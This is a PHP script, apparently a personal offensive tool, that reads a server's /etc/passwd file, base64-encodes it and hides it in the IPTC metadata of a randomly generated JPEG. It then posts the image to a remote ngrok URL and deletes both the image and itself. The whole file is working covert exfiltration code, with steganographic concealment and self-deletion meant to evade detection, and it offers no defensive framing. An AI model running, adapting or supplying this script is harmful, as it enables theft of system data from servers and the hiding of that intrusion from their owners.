<?php
/*
██╗  ██╗██╗██████╗ ██████╗ ███████╗███╗   ██╗██████╗  █████╗ ████████╗ █████╗       
██║  ██║██║██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗      
███████║██║██║  ██║██║  ██║█████╗  ██╔██╗ ██║██║  ██║███████║   ██║   ███████║█████╗
██╔══██║██║██║  ██║██║  ██║██╔══╝  ██║╚██╗██║██║  ██║██╔══██║   ██║   ██╔══██║╚════╝
██║  ██║██║██████╔╝██████╔╝███████╗██║ ╚████║██████╔╝██║  ██║   ██║   ██║  ██║      
╚═╝  ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝      
                                                                                    
██╗███╗   ██╗███████╗███████╗██████╗ ████████╗██╗ ██████╗ ███╗   ██╗                
██║████╗  ██║██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║                
██║██╔██╗ ██║███████╗█████╗  ██████╔╝   ██║   ██║██║   ██║██╔██╗ ██║                
██║██║╚██╗██║╚════██║██╔══╝  ██╔══██╗   ██║   ██║██║   ██║██║╚██╗██║                
██║██║ ╚████║███████║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║                
╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                
 */                                                                                   
####################################################################################
#    HiddenData-Insertion.php
#
# Este script en PHP oculta información sensible del archivo /etc/passwd dentro de una 
# imagen JPEG utilizando la técnica de incrustación de datos IPTC. Luego, la imagen 
# modificada se envía a un servidor remoto a través de Ngrok para compartir la información 
# de manera encubierta.
#
# 06/24/24
#
# Autor: Facundo Fernandez 
#
####################################################################################

# Public URL of Ngrok where you will receive the image / URL pública de Ngrok donde recibirás la imagen
$ngrok_url = 'https://<TU_URL_NGROK>.ngrok-free.app/upload.php';

# Get the contents of the /etc/passwd file in base64 / Obtener el contenido del archivo /etc/passwd en base64
$etc_passwd_content = @file_get_contents('/etc/passwd');
if ($etc_passwd_content === false) {
    log_error("Error al leer /etc/passwd");
}
$etc_passwd_content_base64 = base64_encode($etc_passwd_content);

# Create a random image / Crear una imagen aleatoria
$image = imagecreatetruecolor(800, 600);
$random_color = imagecolorallocate($image, rand(0, 255), rand(0, 255), rand(0, 255));
imagefill($image, 0, 0, $random_color);

# Save the image on the server / Guardar la imagen en el servidor
$image_file = 'passwd.jpg';
imagejpeg($image, $image_file);

# Embed the data in the JPEG image using IPTC / Incrustar los datos en la imagen JPEG utilizando IPTC
$iptc_data = array(
    '2#005' => 'Imagen Aleatoria - /etc/passwd',
    '2#080' => 'Anonymous',
    '2#120' => 'Información oculta - /etc/passwd',
    '2#122' => $etc_passwd_content_base64 # Embed the content of /etc/passwd in base64 / Incrustar el contenido de /etc/passwd en base64
);

# Convert IPTC data to a string / Convertir los datos IPTC a una cadena
$iptc_string = '';
foreach ($iptc_data as $tag => $data) {
    $iptc_string .= iptc_make_tag(substr($tag, 0, 1), substr($tag, 2, 3), $data);
}

# Add IPTC data to the image / Agregar los datos IPTC a la imagen
$content = iptcembed($iptc_string, $image_file);

# Save image with embedded IPTC data / Guardar la imagen con los datos IPTC incrustados
file_put_contents($image_file, $content);

# Upload the image to the public server ngrok / Subir la imagen al servidor público ngrok
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $ngrok_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('file' => new CURLFile($image_file)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

# Verify the response and delete the image if it was sent successfully / Verificar la respuesta y borrar la imagen si se envió exitosamente
if ($response !== false) {
    unlink($image_file);
    echo "La información se ha ocultado en la imagen y se ha enviado correctamente.";
} else {
    echo "Error al subir la imagen.";
}

# Self-destruct / Autodestruirse
$this_script = __FILE__;
unlink($this_script);

# Auxiliary function for creating IPTC labels / Función auxiliar para crear etiquetas IPTC
function iptc_make_tag($rec, $dat, $val) {
    $len = strlen($val);
    if ($len < 0x8000) {
        return chr(0x1c) . chr($rec) . chr($dat) . chr($len >> 8) . chr($len & 0xff) . $val;
    } else {
        return chr(0x1c) . chr($rec) . chr($dat) . chr(0x80) . chr(0x04) . chr(($len >> 24) & 0xff) . chr(($len >> 16) & 0xff) . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $val;
    }
}
?>
